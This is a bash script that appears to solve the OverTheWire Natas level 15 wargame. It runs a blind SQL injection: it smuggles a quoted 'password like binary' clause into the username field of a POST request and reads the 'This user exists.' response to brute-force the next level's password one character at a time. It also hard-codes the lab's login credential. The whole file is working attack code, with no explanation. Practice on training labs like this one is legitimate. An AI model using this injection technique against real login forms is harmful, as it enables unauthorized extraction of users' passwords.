#!/bin/bash

chars=''
passwd=''

for i in {a..z} {A..Z} {0..9};
do
  result=$(curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
  http://natas15.natas.labs.overthewire.org/ -X POST \
  -d "username=natas16\" and password like binary \"%$i%\" #" | \
  grep -o "This user exists.")

  if [ -n "$result" ]; then
    chars+=$i
  fi
done

for i in {0..31}
do
  for i in $(seq 0 ${#chars});
  do
    result=$(curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
    http://natas15.natas.labs.overthewire.org/ -X POST \
    -d "username=natas16\" and password like binary \"$passwd${chars:i:1}%\" #" | \
    grep -o "This user exists.")

    if [ -n "$result" ]; then
      passwd+="${chars:i:1}"
      break
    fi
  done
done

echo $passwd

